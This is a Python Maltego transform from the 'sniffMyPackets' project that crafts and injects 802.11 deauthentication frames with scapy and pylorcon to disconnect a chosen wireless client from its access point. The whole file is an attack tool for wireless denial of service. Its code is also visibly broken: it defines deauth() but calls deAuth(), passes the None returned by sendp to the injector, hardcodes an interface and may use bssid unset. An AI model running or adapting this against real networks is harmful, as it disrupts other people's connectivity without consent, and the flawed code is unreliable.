#!/usr/bin/env python

from common import pylorcon
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from common.entities import wifuClient
from canari.maltego.message import UIMessage
#from canari.maltego.utils import debug, progress
from canari.framework import configure #, superuser

__author__ = 'catalyst256'
__copyright__ = 'Copyright 2013, Sniffmypackets Project'
__credits__ = []

__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'catalyst256'
__email__ = 'catalyst256@gmail.com'
__status__ = 'Development'

__all__ = [
    'dotransform'
]


#@superuser
@configure(
    label='Deauth Packets [U]',
    description='Sends Deauth packets to Access Point',
    uuids=[ 'sniffMyPackets.v2.Deauth2AccessPoint' ],
    inputs=[ ( 'sniffMyPackets', wifuClient ) ],
    debug=True
)

def dotransform(request, response):
  
  client = request.value
  channel = ''
  interface = ''
  pktcount = 64
  if 'sniffMyPackets.monInt' in request.fields:
    interface = request.fields['sniffMyPackets.monInt']
  if 'sniffMyPackets.clientchannel' in request.fields:
    channel = request.fields['sniffMyPackets.clientchannel']
  if 'sniffMyPackets.clientBSSID' in request.fields:
    bssid = request.fields['sniffMyPackets.clientBSSID']
  
  injector = pylorcon.Lorcon("wlan3","rt73usb")
  injector.setfunctionalmode('INJECT')
  injector.setmode('MONITOR')
  injector.setchannel(channel)
  
  packet = sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7),iface=interface)
  
  def deauth(pktcount):
	for n in range(pktcount):
	  injector.txpacket(packet)
  
	  
  deAuth(pktcount)
  response = UIMessage('Deauth packets sent')
  
  return response

